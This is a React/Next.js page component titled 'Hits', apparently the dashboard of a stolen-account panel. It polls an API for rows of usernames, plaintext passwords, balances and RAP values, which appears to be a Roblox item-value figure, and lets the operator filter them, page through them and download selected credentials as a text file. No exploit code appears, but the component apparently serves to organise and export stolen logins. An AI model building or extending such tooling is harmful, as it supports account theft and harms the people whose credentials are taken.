"use client";
import { useState, useRef, useEffect } from "react";
import axios from "axios";
import Styles from "./styles.module.css";
import Link from "next/link";
import { ChevronRight, ChevronsUpDown, Check } from "lucide-react";
const initialData = [
  // {
  //   username: "Row 1 Col 1",
  //   password: "Row 1 Col 2",
  //   balance: "Row 1 Col 3",
  //   summary: "Row 1 Col 4",
  //   rap: "Row 1 Col 5",
  // },
  // {
  //   username: "Row 2 Col 1",
  //   password: "Row 2 Col 2",
  //   balance: "Row 2 Col 3",
  //   summary: "Row 2 Col 4",
  //   rap: "Row 2 Col 5",
  // },
];

const initialCheckboxStates = initialData.map(() => false);

const HitsPage = () => {
  const [isOpen, setIsOpen] = useState(false);
  const [selectedOption, setSelectedOption] = useState("Filter by...");
  const [currentPage, setCurrentPage] = useState(0);
  const containerRef = useRef(null);
  const [allChecked, setAllChecked] = useState(false);
  const [data, setData] = useState(initialData);
  const [checkboxStates, setCheckboxStates] = useState(initialCheckboxStates);
  const [checkedRows, setCheckedRows] = useState([]);

  const fetchData = async () => {
    let filter = "";
    if (selectedOption === "Filter by...") {
      filter = "none";
    } else {
      filter = selectedOption;
    }
    try {
      const response = await axios.get(
        `https://example.com/api/data?filter=${filter}&page=${currentPage}`
      );
      setData(response.data);
    } catch (error) {
      console.error("Error fetching data:", error);
    }
  };

  useEffect(() => {
    // Fetch data initially and set up interval
    fetchData();
    const interval = setInterval(fetchData, 15000);

    // Clean up interval on component unmount
    return () => clearInterval(interval);
  }, [selectedOption, currentPage]); // Re-run effect when selectedOption or currentPage changes

  useEffect(() => {
    document.addEventListener("mousedown", handleClickOutside);
    return () => {
      document.removeEventListener("mousedown", handleClickOutside);
    };
  }, []);

  useEffect(() => {
    setCheckboxStates(data.map(() => false));
    setAllChecked(false);
    setCheckedRows([]);
  }, [data]);

  useEffect(() => {
    if (data.length === 0) {
      setAllChecked(false);
      document.getElementById("headerCheckbox").indeterminate = false;
      return;
    }

    const allChecked = checkboxStates.every(Boolean);
    const someChecked = checkboxStates.some(Boolean);

    setAllChecked(allChecked);
    document.getElementById("headerCheckbox").indeterminate =
      !allChecked && someChecked;
  }, [checkboxStates]);

  const handleHeaderCheckboxChange = (event) => {
    if (data.length === 0) return;
    const checked = event.target.checked;
    setAllChecked(checked);
    setCheckboxStates(checkboxStates.map(() => checked));
    setCheckedRows(checked ? data : []);
  };

  const handleCheckboxChange = (index) => (event) => {
    const updatedCheckboxStates = checkboxStates.map((checked, i) =>
      i === index ? event.target.checked : checked
    );
    setCheckboxStates(updatedCheckboxStates);

    const updatedCheckedRows = updatedCheckboxStates
      .map((checked, i) => (checked ? data[i] : null))
      .filter((row) => row !== null);
    setCheckedRows(updatedCheckedRows);
  };

  const selectOption = (e) => {
    setSelectedOption(e.target.innerText);
    setIsOpen(false);
  };

  const handleClickOutside = (event) => {
    if (containerRef.current && !containerRef.current.contains(event.target)) {
      setIsOpen(false);
    }
  };

  const generateTxtFile = () => {
    if (!checkboxStates.includes(true)) {
      return;
    }
    const headers = ["username", "password", "balance", "summary", "rap"];
    const headerLine = headers.join("\t"); // Join headers with tab space
    console.log("headerLine: ", headerLine);

    const rows = checkedRows.map((row) =>
      [row.username, row.password, row.balance, row.summary, row.rap].join("\t")
    );

    const fileContent = [headerLine, ...rows].join("\n");
    const blob = new Blob([fileContent], { type: "text/plain" });
    const link = document.createElement("a");
    link.href = URL.createObjectURL(blob);
    link.download = "selected_rows.txt";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  const handlePreviousPage = () => {
    if (currentPage > 0) {
      setCurrentPage((prevPage) => prevPage - 1);
    }
  };

  const handleNextPage = () => {
    setCurrentPage((prevPage) => prevPage + 1);
  };

  const filterOptions = () => (
    <div className={Styles.filterOptionsContainer}>
      <div
        onClick={(e) => {
          selectOption(e);
        }}
        className={Styles.option}
      >
        Username
        {selectedOption === "Username" && <Check color="#fafafa" size={14} />}
      </div>
      <div
        onClick={(e) => {
          selectOption(e);
        }}
        className={Styles.option}
      >
        Date
        {selectedOption === "Date" && <Check color="#fafafa" size={14} />}
      </div>
      <div
        onClick={(e) => {
          selectOption(e);
        }}
        className={Styles.option}
      >
        Balance
        {selectedOption === "Balance" && <Check color="#fafafa" size={14} />}
      </div>
      <div
        onClick={(e) => {
          selectOption(e);
        }}
        className={Styles.option}
      >
        RAP
        {selectedOption === "RAP" && <Check color="#fafafa" size={14} />}
      </div>
      <div
        onClick={(e) => {
          selectOption(e);
        }}
        className={Styles.option}
      >
        Summary
        {selectedOption === "Summary" && <Check color="#fafafa" size={14} />}
      </div>
    </div>
  );

  return (
    <div className={Styles.hitsMainContainer}>
      <div className={Styles.navigationContainer}>
        <Link href="/dashboard" className={Styles.navigateToDashboard}>
          Dashboard{" "}
        </Link>
        <ChevronRight size={18} color="#a1a1aa" />
        <span> Hits</span>
      </div>
      <div className={Styles.totalUser}>Users ({data.length})</div>
      <div
        style={{ borderTop: "1px solid #27272a", marginBottom: "12px" }}
      ></div>
      <div className={Styles.filterDownloadContainer}>
        <div
          ref={containerRef}
          onClick={() => {
            setIsOpen(!isOpen);
          }}
          className={Styles.filter}
        >
          <div>{selectedOption}</div>
          {isOpen && filterOptions()}
          <ChevronsUpDown size={12} color="#a1a1aa" />
        </div>

        <div
          className={Styles.download}
          onClick={() => {
            generateTxtFile();
          }}
        >
          Download
        </div>
      </div>
      <div className={Styles.tableContainer}>
        <table className={Styles.table}>
          <thead>
            <tr>
              <th className={Styles.checkboxCell}>
                <input
                  id="headerCheckbox"
                  type="checkbox"
                  checked={allChecked}
                  onChange={handleHeaderCheckboxChange}
                  disabled={data.length === 0}
                  className={Styles.checkebox}
                />
              </th>
              <th>USERNAME</th>
              <th>PASSWORD</th>
              <th>BALANCE</th>
              <th>SUMMARY</th>
              <th>RAP</th>
            </tr>
          </thead>

          <tbody>
            {data.length === 0 ? (
              <tr>
                <td colSpan="6" className={Styles.noDataContainer}>
                  No results.
                </td>
              </tr>
            ) : (
              data.map((row, rowIndex) => (
                <tr key={rowIndex}>
                  <td className={Styles.checkboxCell}>
                    <input
                      type="checkbox"
                      checked={checkboxStates[rowIndex]}
                      onChange={handleCheckboxChange(rowIndex)}
                      className={Styles.checkebox}
                    />
                  </td>
                  <td>{row.username}</td>
                  <td>{row.password}</td>
                  <td>{row.balance}</td>
                  <td>{row.summary}</td>
                  <td>{row.rap}</td>
                </tr>
              ))
            )}
          </tbody>
        </table>
      </div>
      <div className={Styles.tableFooter}>
        <div className={Styles.selectedRowCount}>
          {checkedRows.length} of {data.length} row(s) selected.
        </div>
        <div className={Styles.tableNavBtnContainer}>
          <div
            className={`${Styles.tableNavBtnItem} ${
              currentPage === 0 ? Styles.disabled : ""
            }`}
            onClick={handlePreviousPage}
            style={{ marginRight: "5px" }}
          >
            Previous
          </div>
          <div className={Styles.tableNavBtnItem} onClick={handleNextPage}>
            Next
          </div>
        </div>
      </div>
    </div>
  );
};

export default HitsPage;
